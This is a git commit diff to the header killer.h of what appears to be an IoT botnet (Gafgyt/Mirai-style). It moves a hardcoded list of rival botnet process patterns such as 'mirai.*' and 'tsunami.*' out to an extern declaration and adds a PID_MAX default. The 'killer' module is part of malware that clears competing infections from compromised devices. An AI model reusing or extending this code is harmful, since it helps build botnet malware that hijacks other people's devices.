c36ac50c14b1fda2862d6016e1ef60acaf583bc8
NoSpacesFlies <126734507+NoSpacesFlies@users.noreply.github.com>
2025-05-24 17:09:43 +0300

    Update killer.h

--- bot/headers/killer.h
+++ bot/headers/killer.h
@@ -3,19 +3,14 @@
 #ifndef KILLER_H
 #define KILLER_H
 
+#include <limits.h>
+
+#ifndef PID_MAX
+#define PID_MAX 32768
+#endif
+
 #define GAFGYT_COUNT 10
-static const char *GAFGYT_PROCS[] = {
-    "yakuza.*",
-    "axis.*",
-    "sora.*",
-    "condi.*",
-    "mirai.*",
-    "tsunami.*",
-    "kaiten.*",
-    "hajime.*",
-    "masuta.*",
-    "josho.*",
-};
+extern const char *GAFGYT_PROCS[GAFGYT_COUNT];
 
 void start_killer(void);
 void stop_killer(void);
